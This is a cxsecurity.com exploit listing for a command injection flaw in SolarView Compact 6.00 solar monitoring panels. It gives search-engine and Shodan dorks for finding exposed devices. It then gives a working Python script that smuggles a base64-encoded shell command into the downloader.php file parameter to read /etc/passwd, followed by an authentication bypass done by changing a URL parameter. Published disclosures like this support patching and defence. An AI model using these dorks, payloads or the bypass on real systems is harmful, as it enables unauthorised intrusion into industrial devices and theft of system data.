---
title: SolarView Compact 6.00 - Command Injection
url: https://cxsecurity.com/issue/WLB-2025020005
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-02-14
fetch_date: 2025-10-06T20:32:36.217142
---

# SolarView Compact 6.00 - Command Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **SolarView Compact 6.00 - Command Injection** **2025.02.13**  **![ir](https://cert.cx/cxstatic/images/flags/ir.png) [parsa rezaie khiabanloo](https://cxsecurity.com/author/parsa%2Brezaie%2Bkhiabanloo/1/) **(IR)** ![ir](https://cert.cx/cxstatic/images/flags/ir.png)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A**  **[**Dork:** http.html:"solarview compact"](https://cxsecurity.com/dorks/)** | |

# Exploit Title: SolarView Compact 6.00 - Command Injection
# Date: 2/13/2025
# Exploit Author: parsa rezaie khiabanloo
# Vendor Homepage: SolarView Compact
# Version: 6.00
# Tested on: Windows/Linux/Android(termux)
Step 1 : Attacker can using these dorks and access to find the panel
inurl:"Solar\_Menu.php?menu="
Shodan Dork: http.html:"solarview compact"
Step 2 : Attacker can use this exploit to get Remote Command Injection
import argparse
import requests
def vuln\_check(ip\_address, port):
url = f"http://{ip\_address}:{port}/downloader.php?file=;echo%20Y2F0IC9ldGMvcGFzc3dkCg%3D%3D|base64%20-d|bash%00.zip"
response = requests.get(url)
if response.status\_code == 200:
output = response.text
if "root" in output:
print("Vulnerability detected: Command Injection possible.")
print(f"passwd file content:\n{response.text}")
else:
print("No vulnerability detected.")
else:
print("Error: Unable to fetch response.")
def main():
parser = argparse.ArgumentParser(description="SolarView Compact Command Injection ")
parser.add\_argument("-i", "--ip", help="IP address of the target device", required=True)
parser.add\_argument("-p", "--port", help="Port of the the target device (default: 80)", default=80, type=int)
args = parser.parse\_args()
ip\_address = args.ip
port = args.port
vuln\_check(ip\_address, port)
if \_\_name\_\_ == "\_\_main\_\_":
main()
Step 3 : For Bypass Authentication attacker can change menu value to 0 for example
http://example.com/Solar\_Menu.php?menu=1&app=2
http://example.com/Solar\_Menu.php?menu=0&app=2

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025020005)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top